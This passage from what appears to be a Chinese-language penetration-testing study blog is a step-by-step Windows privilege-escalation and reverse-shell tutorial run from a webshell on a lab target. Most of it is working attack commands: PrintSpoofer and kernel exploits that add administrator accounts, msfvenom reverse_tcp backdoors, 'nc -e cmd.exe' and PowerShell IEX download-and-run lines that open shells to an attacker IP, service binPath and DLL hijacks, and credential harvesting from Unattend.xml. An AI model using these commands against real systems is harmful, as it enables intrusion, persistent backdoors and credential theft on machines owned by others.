+<pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net localgroup administrators xiaoshaK /add"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net user xiaoshaK"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220213110232859.png" alt="image-20220213110232859"></p>
+<p>可以看到在管理员组里了</p>
+<p>增加进管理员组后我们就可以连接他的3389</p>
+<pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "netstat -ano"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220213110428517.png" alt="image-20220213110428517"></p>
+<p>可以看到3389是开放的，可以使用mstsc连接创建的用户</p>
+<h3 id="CVE-2014-4113-MS14-058-提权"><a href="#CVE-2014-4113-MS14-058-提权" class="headerlink" title="CVE-2014-4113 (MS14-058)提权"></a>CVE-2014-4113 (MS14-058)提权</h3><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>Microsoft Windows下的 win32k.sys是Windows子系统的内核部分，是一个内核模式设备驱动程序，它包含有窗口管理器、后者控制窗口显示和管理屏幕输出等。</p>
+<p>如果Windows内核模式驱动程序不正确地处理内存中的对象，则存在一个特权提升漏洞。成功利用此漏洞的攻击者可以运行内核模式中的任意代码。攻击者随后可安装程序；查看、更改或删除数据；或者创建拥有完全管理权限的新帐户。</p>
+<h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>影响所有Windows x64，包括Windows 7 和 Windows Server 2008 R2 及以下版本。</p>
+<h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>上传编译好的exp到webshell提权</p>
+<p>可以看到cmd可执行</p>
+<p>如果此命令不可执行可以在可执行目录下上传cmd</p>
+<p><img src="/2021/12/28/day37/image-20220213112241194.png" alt="image-20220213112241194"></p>
+<p>如果上传出错显示 缺少对象，那是因为服务器上传的文件大小超出了，此时我们选在webshell后门下的远程下载功能，下载远程cmd到本地可执行目录</p>
+<p>上传编译好的exp，执行即可获取系统权限</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\debug\WIA\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220213112700644.png" alt="image-20220213112700644"></p>
+<p><img src="/2021/12/28/day37/image-20220213112920409.png" alt="image-20220213112920409"></p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\debug\WIA\win64.exe "whoami"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220213113006345.png" alt="image-20220213113006345"></p>
+<p>创建管理员用户同上操作</p>
+<h3 id="CVE-2020-0787-提权"><a href="#CVE-2020-0787-提权" class="headerlink" title="CVE-2020-0787 提权"></a><strong>CVE-2020-0787</strong> 提权</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>当Windows Background Intelligent Transfer Service (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。</p>
+<p>要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p>
+<h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><ul>
+<li>Windows RT 8.1</li>
+<li>Windows 7</li>
+<li>Windows 10</li>
+<li>Windows 10 Version 1607</li>
+<li>Windows 10 Version 1709</li>
+<li>Windows 10 Version 1803</li>
+<li>Windows 10 Version 1809</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012 R2</li>
+<li>Windows Server 2016</li>
+<li>Windows Server 2019</li>
+<li>Windows Server, version 1903 </li>
+<li>Windows Server, version 1909 </li>
+</ul>
+<h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>此提权不能使用webshell提权，需要登录到系统</p>
+<pre class="line-numbers language-none"><code class="language-none">net user xiaoshaK 123456 /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220213120809168.png" alt="image-20220213120809168"></p>
+<p>建立普通用户，切换用户</p>
+<p>查看权限</p>
+<p><img src="/2021/12/28/day37/image-20220213120936761.png" alt="image-20220213120936761"></p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">Releases · cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION · GitHub</a>提权exp，上传到系统</p>
+<p><img src="/2021/12/28/day37/image-20220213121055148.png" alt="image-20220213121055148"></p>
+<pre class="line-numbers language-none"><code class="language-none">c:\windows\debug\WIA\BitsArbitraryFileMoveExploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行，之后弹出cmd，再次查看权限</p>
+<p><img src="/2021/12/28/day37/image-20220213121307122.png" alt="image-20220213121307122"></p>
+<p>看到是系统权限了</p>
+<h2 id="使用meta-split提权"><a href="#使用meta-split提权" class="headerlink" title="使用meta split提权"></a>使用meta split提权</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>kali自带开源漏洞检测工具，msfconsole开启工具</p>
+<p>msf命令</p>
+<pre class="line-numbers language-none"><code class="language-none">ps 列出进程
+background 把session放置后台
+sessions 查看会话
+back 返回主界面
+shell得到终端
+search搜索模块
+show 列模块
+info 查看模块信息
+use 使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><strong>1.在kali上生成反向连接的后门</strong>。ip为kali的ip</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f exe &gt;s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215110344460.png" alt="image-20220215110344460"></p>
+<p>在桌面上生成s.exe</p>
+<p><strong>2.将生成的反向连接后门上传到靶机的可执行文件夹下。</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215110045301.png" alt="image-20220215110045301"></p>
+<p><strong>3.开启msf，使用监听模块监听ip端口。</strong></p>
+<p>ip和端口要生成后门的端口和ip一致，ip可以设置成0.0.0.0，允许任何主机连接入来，但是存在风险。</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+show options
+set lhost 192.168.0.195 
+set lport 12345 
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215110619540.png" alt="image-20220215110619540"></p>
+<p><img src="/2021/12/28/day37/image-20220215113131032.png" alt="image-20220215113131032"></p>
+<p><strong>4.在webshell执行exe</strong>。执行后会获取一个session</p>
+<p><img src="/2021/12/28/day37/image-20220215113140445.png" alt="image-20220215113140445"></p>
+<p><img src="/2021/12/28/day37/image-20220215113157072.png" alt="image-20220215113157072"></p>
+<p>执行后得到了meterpreter</p>
+<p>help可查看帮助文档</p>
+<p>getuid查看权限，发现权限较低</p>
+<p><img src="/2021/12/28/day37/image-20220215113429296.png" alt="image-20220215113429296"></p>
+<p>查询补丁</p>
+<pre class="line-numbers language-none"><code class="language-none">run post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215115537504.png" alt="image-20220215115537504"></p>
+<pre class="line-numbers language-none"><code class="language-none">background
+将session1放到后台
+sessions 1
+即可再次进入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>5.进行提权</strong></p>
+<p>可用常规的exp测试，看能否成功提权</p>
+<pre class="line-numbers language-none"><code class="language-none">常见的提权模块
+ms14_058 内核模式驱动程序中的漏洞可能允许远程执行代码 
+ms16_016 WebDAV本地提权漏洞(CVE-2016-0051) 
+ms16_032 MS16-032 Secondary Logon Handle 本地提权漏漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者列出可用的exp模块</p>
+<pre class="line-numbers language-none"><code class="language-none">use post/multi/recon/local_exploit_suggester 
+set session 1 
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215121254696.png" alt="image-20220215121254696"></p>
+<p>我们这里使用exploit/windows/local/ms16_075_reflection_juicy模块</p>
+<p>查看参数</p>
+<p><img src="/2021/12/28/day37/image-20220215121527483.png" alt="image-20220215121527483"></p>
+<p>这里设置session 为1 运行即可</p>
+<p><img src="/2021/12/28/day37/image-20220215121640194.png" alt="image-20220215121640194"></p>
+<p>运行后查看权限发现是一个系统权限了</p>
+<p><strong>6.权限维持</strong></p>
+<p>ps查看进程</p>
+<p>migrate迁移</p>
+<p><img src="/2021/12/28/day37/image-20220215122106822.png" alt="image-20220215122106822"></p>
+<h2 id="交互shell和非交互shell"><a href="#交互shell和非交互shell" class="headerlink" title="交互shell和非交互shell"></a>交互shell和非交互shell</h2><h3 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h3><p>交互shell就是shell等待你的输入，并且立即执行你提交的命令。</p>
+<p>这种模式被称作交互式是因为shell与用户进行交互。</p>
+<p>这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当签退后，shell也终止了。</p>
+<p>需要进行信息交互，例如输入某个信息，会返回信息，你需要对其输入内容，输入会执行命令。</p>
+<p>cmd 终端、msf反弹后门shell、nc反弹shell，这些都属于交互shell</p>
+<h3 id="非交互shell"><a href="#非交互shell" class="headerlink" title="非交互shell"></a>非交互shell</h3><p>非交互式shell以shell script(非交互)方式执行。</p>
+<p>在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
+<p><img src="/2021/12/28/day37/image-20220215144716590.png" alt="image-20220215144716590"></p>
+<h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>反弹shell提权是使用工具或者脚本，从服务器主动连接攻击者客户端，是从内部向外部通信，所以能穿透防火墙。</p>
+<p>防火墙一般只对进来的流量进行拦截，并不对主动出去的流量进行拦截，所以反弹shell可以逃逸很多的防火墙。</p>
+<p>另外反弹shell是交互shell，通信是交互的，所以能执行的命令更多，而且没有超时限制，可以从受害者的服务器上下载，更多的资料。</p>
+<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p><strong>在kali监听666</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>上传nc.exe到靶机可执行文件夹下</strong></p>
+<p><img src="/2021/12/28/day37/image-20220215145644483.png" alt="image-20220215145644483"></p>
+<p><strong>主动连接，在kali上即可得到一个交互式shell</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\nc.exe -e c:\windows\system32\cmd.exe 192.168.80.134 666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220215145709304.png" alt="image-20220215145709304"></p>
+<p><img src="/2021/12/28/day37/image-20220215145725913.png" alt="image-20220215145725913"></p>
+<h3 id="powershell反弹cmd"><a href="#powershell反弹cmd" class="headerlink" title="powershell反弹cmd"></a>powershell反弹cmd</h3><p>这里使用powercat，是netcat的powershell版本</p>
+<p><strong>kali上把powecat解压</strong></p>
+<p><strong>监听</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>/*<strong>目标执行</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorh ino/powercat/master/powercat.ps1'); powercat -c 192.168.80.134 -p 777 -e cmd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>github得搭梯子访问，这里我们也可以在kali上搭一个web服务器，让他从服务器上下载也行</p>
+<p>*/</p>
+<p><strong>在kali上的powercat文件夹处开放一个web服务器</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo python -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>在webshell执行命令</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.80.134/powercat.ps1'); powercat -c 192.168.80.134 -p 777 -e cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行后即可得到一个交互式shell</p>
+<p><img src="/2021/12/28/day37/image-20220215152911909.png" alt="image-20220215152911909"></p>
+<h3 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h3><p>Nishang(<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell</p>
+<p><strong>Reverse TCP shell</strong></p>
+<p>开启监听</p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>目标执行</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke- PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.80.134 -port 888 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者在服务器搭建下载</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.80.134 -port 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行后得到交互shell</p>
+<p><img src="/2021/12/28/day37/image-20220215155742961.png" alt="image-20220215155742961"></p>
+<p><strong>Reverse UDP shell</strong></p>
+<p>开启监听</p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvup 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>目标执行</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 192.168.80.134 -port 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行后得到交互式shell</p>
+<h3 id="python反弹cmd-shell"><a href="#python反弹cmd-shell" class="headerlink" title="python反弹cmd shell"></a>python反弹cmd shell</h3><p>使用python编写反弹shell，如果目标支持python3可以脚本直接执行即可</p>
+<p>如果遇到杀软或目标机不支持python，可使用生成的exe版本。</p>
+<p><strong>kali监听999端口</strong></p>
+<p><strong>将脚本放到靶机下，用python执行</strong></p>
+<p><img src="/2021/12/28/day37/image-20220216112513542.png" alt="image-20220216112513542"></p>
+<p>得到了交互式shell</p>
+<p><img src="/2021/12/28/day37/image-20220216112544024.png" alt="image-20220216112544024"></p>
+<p>所以此方法可行</p>
+<p>接下来我们尝试在webshell上传exe执行弹shell</p>
+<p>上传到可执行文件夹下</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行此命令将py文件生成为exe</p>
+<pre class="line-numbers language-none"><code class="language-none">pyinstaller -Fw pycat.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220216113232870.png" alt="image-20220216113232870"></p>
+<p>但是在asp、aspx上传时由于exe太大无法上传</p>
+<p><img src="/2021/12/28/day37/image-20220216112809716.png" alt="image-20220216112809716"></p>
+<p><img src="/2021/12/28/day37/image-20220216112859775.png" alt="image-20220216112859775"></p>
+<p>我们将exe放到kali上，让asp下载进去</p>
+<p><img src="/2021/12/28/day37/image-20220216113838852.png" alt="image-20220216113838852"></p>
+<p><img src="/2021/12/28/day37/image-20220216113853296.png" alt="image-20220216113853296"></p>
+<p>目标执行</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\pycat.exe --host 192.168.80.134 --port 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到了交互式shell</p>
+<p><img src="/2021/12/28/day37/image-20220216114009541.png" alt="image-20220216114009541"></p>
+<h2 id="windows系统配置错误提权"><a href="#windows系统配置错误提权" class="headerlink" title="windows系统配置错误提权"></a>windows系统配置错误提权</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>Windows在系统启动时，会伴随着一些高权服务启动(windows服务是以system权限运行的)倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如DLL劫持 </p>
+<p>windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。</p>
+<p>windows服务是以system权限运行的，其文件夹、文件和注册表key-value都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。</p>
+<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>PrivescCheck加载脚本并执行，列出可能存在问题的所有服务</p>
+<p>将脚本放在kali，在文件夹内启动http服务</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/PrivescCheck.ps1'); Invoke-PrivescCheck"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看到列出了一些服务</p>
+<p><img src="/2021/12/28/day37/image-20220228124821076.png" alt="image-20220228124821076"></p>
+<p>其中我们发现</p>
+<p><img src="/2021/12/28/day37/image-20220228124951355.png" alt="image-20220228124951355"></p>
+<p>NT AUTHORITY\Authenticated Users 普通用户也能设置文件</p>
+<p>所以我们可以对UsoSvc服务进行修改</p>
+<p>我们将msf的反向连接后门放入</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=666 -f exe &gt;666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220228125412204.png" alt="image-20220228125412204"></p>
+<pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220228125518637.png" alt="image-20220228125518637"></p>
+<pre class="line-numbers language-none"><code class="language-none">sc query UsoSvc
+sc stop UsoSvc 
+sc config usosvc binPath= "C:\ProgramData\666.exe" 注意=号后有空格
+sc start UsoSvc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先查询此服务为running状态，stop后停止。</p>
+<p>此时修改服务路径为刚才的后门路径</p>
+<p>打开msf监听</p>
+<pre class="line-numbers language-none"><code class="language-none">set payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220228130418188.png" alt="image-20220228130418188"></p>
+<p>之后在启动修改后的服务，即可得到session</p>
+<p><img src="/2021/12/28/day37/image-20220301113514316.png" alt="image-20220301113514316"></p>
+<p>权限也为系统权限</p>
+<p>但是session会自动退出我们需要坐下进程迁移</p>
+<pre class="line-numbers language-none"><code class="language-none">show advanced 显示高级权限
+set AutoRunScript migrate -f 自动迁移进程
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>run后在启动服务，会自动迁移进程，就会稳定得多</p>
+<p><strong>或者</strong></p>
+<p>也可使用Metasploit中的攻击模块 exploit/windows/local/service_permissions</p>
+<p>开启监听监听模块</p>
+<p>我们运行刚才的后门，返回一个session</p>
+<p>getuid发现权限比较低，是iis权限</p>
+<p><img src="/2021/12/28/day37/image-20220301114037670.png" alt="image-20220301114037670"></p>
+<p>我们运行此攻击模块，set session为此session号，run即可</p>
+<p>运行后他会自动替换并执行</p>
+<p><img src="/2021/12/28/day37/image-20220301114433661.png" alt="image-20220301114433661"></p>
+<p>看到拿到了另一个session</p>
+<p>getuid后权限为系统权限</p>
+<h3 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h3><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p>
+<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
+<p>如下</p>
+<p>没有双引号时候windows会把空格前面当作exe执行</p>
+<p><img src="/2021/12/28/day37/image-20220228150745069.png" alt="image-20220228150745069"></p>
+<h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们使用PrivescCheck此脚本会遍历出带有空格的文件</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/PrivescCheck.ps1'); Invoke-PrivescCheck"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者使用命令</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:Windows" |findstr/i /v """<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220228152445912.png" alt="image-20220228152445912"></p>
+<p>看见存在空格且路径是可写的，可能就存在空格</p>
+<p>如果C盘可写上传反弹后门到C:\Program.exe即可</p>
+<p>系统在重启 获取管理员重启该服务的时候就会获取系统权限</p>
+<pre class="line-numbers language-none"><code class="language-none">set AutoRunScript migrate -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同时设置自动迁移进程，防止断开</p>
+<h3 id="注册键AlwaysInstallElevated"><a href="#注册键AlwaysInstallElevated" class="headerlink" title="注册键AlwaysInstallElevated"></a>注册键AlwaysInstallElevated</h3><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NTAuthority\System权限来安装恶意的MSI文件。 </p>
+<p>windows install是windows操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。</p>
+<p>windows install通过msiexec.exe安装MSI文件，双击MSI文件就会运行msiexec.exe。 原理:是因为用户打开了windows installer 特权安装功能</p>
+<h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>运行gpedit.msc，如下操作</p>
+<p><img src="/2021/12/28/day37/image-20220301123150381.png" alt="image-20220301123150381"></p>
+<p>使用PowerUp检测注册表是否有设置，如果返回true证明可以利用</p>
+<pre class="line-numbers language-none"><code class="language-none">PowerShell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://192.168.80.134/PowerUp.ps1'); Get-RegAlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是iis_user用户权限较低，返回false</p>
+<p><img src="/2021/12/28/day37/image-20220301123615054.png" alt="image-20220301123615054"></p>
+<p>以use用户权限运行返回true</p>
+<p><img src="/2021/12/28/day37/image-20220301123729695.png" alt="image-20220301123729695"></p>
+<p>上传 COMahawk64.exe并执行可返回一个账号密码</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\COMahawk64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220301123942601.png" alt="image-20220301123942601"></p>
+<p>可以看到账号在管理员组里面</p>
+<p><img src="/2021/12/28/day37/image-20220301124023071.png" alt="image-20220301124023071"></p>
+<h3 id="本地dll劫持提权"><a href="#本地dll劫持提权" class="headerlink" title="本地dll劫持提权"></a>本地dll劫持提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Windows程序启动的时候需要DLL。如果DLL 不存在，可以通过在应用程序要查找的位置放置恶意DLL来提权。</p>
+<p>通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<ol>
+<li>应用程序加载的目录 </li>
+<li>C:\Windows\System32 </li>
+<li>C:\Windows\System </li>
+<li>C:\Windows </li>
+<li>当前工作目录Current Working Directory，CWD </li>
+<li>在PATH环境变量的目录（先系统后用户）</li>
+</ol>
+<p>这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载。</p>
+<h4 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h4><p>程序运行一般会加载系统dll或本身程序自带的dll，我们将程序执行时需要加载的dll文件替换成木马程序，那么我们下次在启动程序时所加载的dll就是我们替换的那个木马程序了。</p>
+<p>收集进程加载的dll-&gt;制作dll木马并上传-&gt;替换dll-&gt;启动应用后成功</p>
+<p><strong>收集进程加载的dll</strong></p>
+<p>使用火绒剑分析进程执行时加载了那些dll</p>
+<p><img src="/2021/12/28/day37/image-20220301133415247.png" alt="image-20220301133415247"></p>
+<p>一般情况系统文件系统文件无法更改，我们目标在位置文件或数字签名文件</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f dll &gt; libcurl_x86.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将生成的dll替换原本路径下的dll</p>
+<p><img src="/2021/12/28/day37/image-20220301133502324.png" alt="image-20220301133502324"></p>
+<p>打开msf监听，注意设置payload</p>
+<p><img src="/2021/12/28/day37/image-20220301133210801.png" alt="image-20220301133210801"></p>
+<h3 id="自动安装配置文件提权"><a href="#自动安装配置文件提权" class="headerlink" title="自动安装配置文件提权"></a>自动安装配置文件提权</h3><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>网络管理员在内网中给多台机器配置同一个环境的时候，一般会使用脚本进行批量部署，也就是会使用安装配置文件，这些文件中包含所有的安装配置信息，其中还有一些包含着本地管理员账号和密码。</p>
+<h4 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h4><p>我们可搜索Unattend.xml文件</p>
+<pre class="line-numbers language-none"><code class="language-none">dir /b /s c:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220301134351947.png" alt="image-20220301134351947"></p>
+<p>或者使用msf 的post/windows/gather/enum_unattend模块对配置文件扫描</p>
+<p><img src="/2021/12/28/day37/image-20220301134615760.png" alt="image-20220301134615760"></p>
+<h2 id="第三方组件提权"><a href="#第三方组件提权" class="headerlink" title="第三方组件提权"></a>第三方组件提权</h2><p>做提权时，如果发现webshell的cmd无法执行命令，并且没有任何可上传目录，我们可以看看目标有无一些第三方服务</p>
+<p>利用portscan</p>
+<p><img src="/2021/12/28/day37/image-20220301150539426.png" alt="image-20220301150539426"></p>
+<h3 id="sqlserver提权"><a href="#sqlserver提权" class="headerlink" title="sqlserver提权"></a>sqlserver提权</h3><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>如果网站里面使用的数据库是sqlserver，那么如果找到sa的密码，利用提权脚本，执行命令。</p>
+<p>但是不一定的系统权限，还要看管理员开始安装sqlserver的权限设置，一般情况是system权限或者pulic，均能执行命令</p>
+<p>敏感文件</p>
+<pre class="line-numbers language-none"><code class="language-none">web.config 
+config.asp 
+conn.aspx 
+database.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h4><p>使用mssql连接工具或者webshell net提权脚本输入账号和密码连接</p>
+<p><img src="/2021/12/28/day37/image-20220301150845580.png" alt="image-20220301150845580"></p>
+<p>开启cmd</p>
